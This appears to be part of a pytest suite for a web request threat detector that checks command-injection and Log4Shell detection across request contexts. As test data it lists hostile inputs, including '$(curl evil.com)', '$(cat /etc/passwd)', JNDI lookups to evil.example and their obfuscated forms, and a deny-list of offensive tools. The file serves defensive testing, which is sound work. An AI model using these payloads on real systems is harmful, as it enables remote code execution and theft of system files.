        "x`file�name /etc/passwd`", id="glued_backtick_replacement_char_and_path"
    ),
    pytest.param("x`日本語 /etc/passwd`", id="glued_backtick_cjk_word_and_path"),
]


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", GLUED_BACKTICK_NON_ASCII_TOKEN_NOT_FLAGGED)
async def test_glued_backtick_non_printable_ascii_token_not_flagged(
    payload: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="198.51.100.4", context="request_body"
    )
    assert not any(
        threat.get("category") == "cmd_injection" for threat in result["threats"]
    )


UNAMBIGUOUS_DOLLAR_SUBSTITUTION_PAYLOADS = [
    pytest.param("$(cat /etc/passwd)", id="dollar_paren_bare_cat_passwd"),
    pytest.param("$(curl evil.com)", id="dollar_paren_bare_curl_evil_com"),
    pytest.param("x$(curl evil.com)", id="dollar_paren_glued_prefix_curl_evil_com"),
    pytest.param("${IFS}", id="dollar_brace_bare_ifs"),
    pytest.param("$(nmap -sV target.example)", id="dollar_paren_bare_nmap"),
    pytest.param("$(mkfifo /tmp/f)", id="dollar_paren_bare_mkfifo"),
]

BARE_DOLLAR_SUBSTITUTION_OR_GLUED_BACKTICK_AMBIGUOUS_BY_DESIGN = [
    pytest.param("$(whoami)", id="dollar_paren_bare_whoami"),
    pytest.param("foo$(whoami)bar", id="dollar_paren_glued_wrapped_whoami"),
    pytest.param("x`nmap`", id="glued_backtick_denylist_nmap"),
    pytest.param("x`socat`", id="glued_backtick_denylist_socat"),
    pytest.param("x`msfconsole`", id="glued_backtick_denylist_msfconsole"),
    pytest.param("x`msfvenom`", id="glued_backtick_denylist_msfvenom"),
    pytest.param("x`certutil`", id="glued_backtick_denylist_certutil"),
    pytest.param("x`bitsadmin`", id="glued_backtick_denylist_bitsadmin"),
    pytest.param("x`powershell`", id="glued_backtick_denylist_powershell"),
    pytest.param("x`pwsh`", id="glued_backtick_denylist_pwsh"),
    pytest.param("x`mkfifo`", id="glued_backtick_denylist_mkfifo"),
    pytest.param("x`aria2c`", id="glued_backtick_denylist_aria2c"),
]


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "payload", BARE_DOLLAR_SUBSTITUTION_OR_GLUED_BACKTICK_AMBIGUOUS_BY_DESIGN
)
async def test_bare_dollar_substitution_or_glued_backtick_not_flagged_in_body(
    payload: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="request_body"
    )
    assert result["is_threat"] is False


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "payload", BARE_DOLLAR_SUBSTITUTION_OR_GLUED_BACKTICK_AMBIGUOUS_BY_DESIGN
)
async def test_bare_dollar_substitution_or_glued_backtick_detected_in_query_param(
    payload: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="query_param"
    )
    assert result["is_threat"] is True
    assert any(
        threat.get("category") == "cmd_injection" for threat in result["threats"]
    )


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", UNAMBIGUOUS_DOLLAR_SUBSTITUTION_PAYLOADS)
async def test_unambiguous_dollar_substitution_or_denylist_detected_in_body(
    payload: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="request_body"
    )
    assert result["is_threat"] is True
    assert any(
        threat.get("category") == "cmd_injection" for threat in result["threats"]
    )


BARE_SHELL_COMMAND_DOLLAR_SUBSTITUTION_PROBES = [
    pytest.param("$(id)", id="dollar_paren_bare_id"),
    pytest.param("$(pwd)", id="dollar_paren_bare_pwd"),
    pytest.param("$(whoami)", id="dollar_paren_bare_whoami"),
    pytest.param("$(uptime)", id="dollar_paren_bare_uptime"),
    pytest.param("$(w)", id="dollar_paren_bare_w"),
    pytest.param("$(who)", id="dollar_paren_bare_who"),
    pytest.param("$(groups)", id="dollar_paren_bare_groups"),
    pytest.param("$(set)", id="dollar_paren_bare_set"),
    pytest.param("${IFS}", id="dollar_brace_bare_ifs"),
]


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", BARE_SHELL_COMMAND_DOLLAR_SUBSTITUTION_PROBES)
@pytest.mark.parametrize("context", ["query_param", "url_path"])
async def test_bare_shell_command_dollar_substitution_detected(
    payload: str, context: str
) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context=context
    )
    assert result["is_threat"] is True
    assert any(
        threat.get("category") == "cmd_injection" for threat in result["threats"]
    )


GLUED_AMBIGUOUS_TOKEN_DOLLAR_SUBSTITUTION_PAYLOADS = [
    pytest.param("$(id)", id="dollar_paren_bare_id"),
    pytest.param("search$(id)", id="dollar_paren_glued_prefix_search_id"),
]


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", GLUED_AMBIGUOUS_TOKEN_DOLLAR_SUBSTITUTION_PAYLOADS)
async def test_ambiguous_dollar_substitution_payload_is_detected_in_query_param(
    payload: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="query_param"
    )
    assert result["is_threat"] is True
    assert any(
        threat.get("category") == "cmd_injection" for threat in result["threats"]
    )


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", GLUED_AMBIGUOUS_TOKEN_DOLLAR_SUBSTITUTION_PAYLOADS)
async def test_ambiguous_dollar_substitution_payload_is_detected_in_url_path(
    payload: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="url_path"
    )
    assert result["is_threat"] is True
    assert any(
        threat.get("category") == "cmd_injection" for threat in result["threats"]
    )


JQUERY_AND_JS_TEMPLATE_DOLLAR_SUBSTITUTION_BENIGN_IN_REQUEST_BODY = [
    pytest.param("$(id).addClass('active');", id="jquery_selector_bare_id_call"),
    pytest.param(
        "$('#submit-button').on('click', handleSubmit);",
        id="jquery_selector_hash_id_call",
    ),
    pytest.param("const label = `Welcome ${obj.prop}`;", id="js_template_dotted_prop"),
    pytest.param("const path = `/users/${id}`;", id="js_template_bare_var_brace"),
    pytest.param(
        "const greeting = `Hi ${name}, you have ${count} items`;",
        id="js_template_multiple_bare_vars",
    ),
]


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "payload", JQUERY_AND_JS_TEMPLATE_DOLLAR_SUBSTITUTION_BENIGN_IN_REQUEST_BODY
)
async def test_jquery_and_js_template_dollar_substitution_not_flagged_in_request_body(
    payload: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="198.51.100.4", context="request_body"
    )
    assert result["is_threat"] is False


LOG4SHELL_JNDI_PAYLOADS = [
    pytest.param("${jndi:ldap://evil.example/a}", id="log4shell_direct_ldap"),
    pytest.param("${jndi:rmi://evil.example/a}", id="log4shell_direct_rmi"),
    pytest.param("${jndi:dns://evil.example/a}", id="log4shell_direct_dns"),
    pytest.param("${lower:j}ndi", id="log4shell_obfuscated_lower_bare"),
    pytest.param("${::-j}ndi", id="log4shell_obfuscated_default_value_bare"),
    pytest.param(
        "${${lower:j}ndi:ldap://evil.example/a}",
        id="log4shell_obfuscated_nested_full_exploit",
    ),
]


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", LOG4SHELL_JNDI_PAYLOADS)
async def test_log4shell_jndi_payload_is_detected_in_request_body(
    payload: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="request_body"
    )
    assert result["is_threat"] is True
    assert any(
        threat.get("category") == "cmd_injection" for threat in result["threats"]
    )


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", LOG4SHELL_JNDI_PAYLOADS)
async def test_log4shell_jndi_payload_is_detected_in_query_param(
    payload: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="query_param"
    )
    assert result["is_threat"] is True
    assert any(
        threat.get("category") == "cmd_injection" for threat in result["threats"]
    )


LOG4SHELL_JNDI_HEADER_PAYLOADS = [
    pytest.param("${jndi:ldap://evil.example/a}", id="log4shell_direct_ldap"),
    pytest.param("${lower:j}ndi", id="log4shell_obfuscated_lower_bare"),
    pytest.param("${::-j}ndi", id="log4shell_obfuscated_default_value_bare"),
]


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", LOG4SHELL_JNDI_HEADER_PAYLOADS)
async def test_log4shell_jndi_payload_is_detected_in_header(
    payload: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="header"
    )
    assert result["is_threat"] is True
    assert any(
        threat.get("category") == "cmd_injection" for threat in result["threats"]
    )


SQL_KEYWORD_GLUED_EXEMPTION_BYPASS_CASES = [
    pytest.param("x`id` JOIN accounts", id="backtick_ambiguous_keyword_not_glued"),
    pytest.param("x$(id) JOIN accounts", id="dollar_paren_ambiguous_keyword_not_glued"),
]


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", SQL_KEYWORD_GLUED_EXEMPTION_BYPASS_CASES)
async def test_sql_keyword_not_glued_no_longer_exempts_ambiguous_token_in_query_param(
    payload: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="query_param"
    )
    assert result["is_threat"] is True
    assert any(
        threat.get("category") == "cmd_injection" for threat in result["threats"]
    )


SQL_KEYWORD_GLUED_EXEMPTION_STILL_APPLIES_CASES = [
    pytest.param("SELECT`id`FROM users", id="backtick_keyword_glued_no_space"),
    pytest.param("SELECT$(id)FROM users", id="dollar_paren_keyword_glued_no_space"),
]


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", SQL_KEYWORD_GLUED_EXEMPTION_STILL_APPLIES_CASES)
async def test_sql_keyword_glued_no_space_still_exempts_ambiguous_token_in_query_param(
    payload: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="query_param"
    )
    assert result["is_threat"] is False


LOG4SHELL_JNDI_URL_PATH_PAYLOADS = [
    pytest.param("${jndi:ldap://evil.example/a}", id="log4shell_direct_ldap"),
    pytest.param("${lower:j}ndi", id="log4shell_obfuscated_lower_bare"),
    pytest.param("${::-j}ndi", id="log4shell_obfuscated_default_value_bare"),
    pytest.param(
        "${${lower:j}ndi:ldap://evil.example/a}",
        id="log4shell_obfuscated_nested_full_exploit",
    ),
]


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", LOG4SHELL_JNDI_URL_PATH_PAYLOADS)
async def test_log4shell_jndi_payload_matched_by_dedicated_pattern_in_url_path(
    payload: str,
) -> None:
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="url_path"
    )
    assert result["is_threat"] is True
    assert any(
        threat.get("pattern") == _LOG4SHELL_JNDI_LOOKUP_RE
        for threat in result["threats"]
    )


_BACKTICK_WINDOW_OFFSETS = [39, 40, 41, 200, 4096]


def _glued_backtick_padded_shell_metacharacter(offset: int) -> str:
    return "`custom_col`" + "A" * offset + "; echo"


def _glued_backtick_padded_no_metacharacter(offset: int) -> str:
    return "`custom_col`" + "A" * offset


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "offset",
    _BACKTICK_WINDOW_OFFSETS,
    ids=[f"offset_{o}" for o in _BACKTICK_WINDOW_OFFSETS],
)
async def test_glued_backtick_far_shell_metacharacter_detected_in_request_body(
    offset: int,
) -> None:
    result = await sus_patterns_handler.detect(
        content=_glued_backtick_padded_shell_metacharacter(offset),
        ip_address="203.0.113.9",
        context="request_body",
    )
    assert result["is_threat"] is True
    assert any(
        threat.get("category") == "cmd_injection" for threat in result["threats"]
    )


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "offset",
    _BACKTICK_WINDOW_OFFSETS,
    ids=[f"offset_{o}" for o in _BACKTICK_WINDOW_OFFSETS],
)
async def test_glued_backtick_padding_with_no_metacharacter_not_flagged(
    offset: int,
) -> None:
    result = await sus_patterns_handler.detect(
        content=_glued_backtick_padded_no_metacharacter(offset),
        ip_address="198.51.100.4",
        context="request_body",
    )
    assert result["is_threat"] is False


@pytest.mark.asyncio
async def test_glued_backtick_far_metacharacter_bounded_by_intervening_quote() -> None:
    payload = "`custom_col`" + "'" + "A" * 200 + "; echo"
    result = await sus_patterns_handler.detect(
        content=payload, ip_address="198.51.100.4", context="request_body"
    )
    assert result["is_threat"] is False


@pytest.mark.parametrize(
    "offset",
    _BACKTICK_WINDOW_OFFSETS,
    ids=[f"offset_{o}" for o in _BACKTICK_WINDOW_OFFSETS],
)
def test_backtick_window_reaches_the_full_gap_when_no_delimiter_present(
    offset: int,
) -> None:
    import re

    from guard_core.handlers.suspatterns_handler import (
        _GLUED_BACKTICK_CANDIDATE_RE,
        _backtick_pair_context_window,
    )

    content = _glued_backtick_padded_no_metacharacter(offset)
    match = re.search(_GLUED_BACKTICK_CANDIDATE_RE, content)
    assert match is not None
    window = _backtick_pair_context_window(content, match.start(), match.end())
    assert window == content
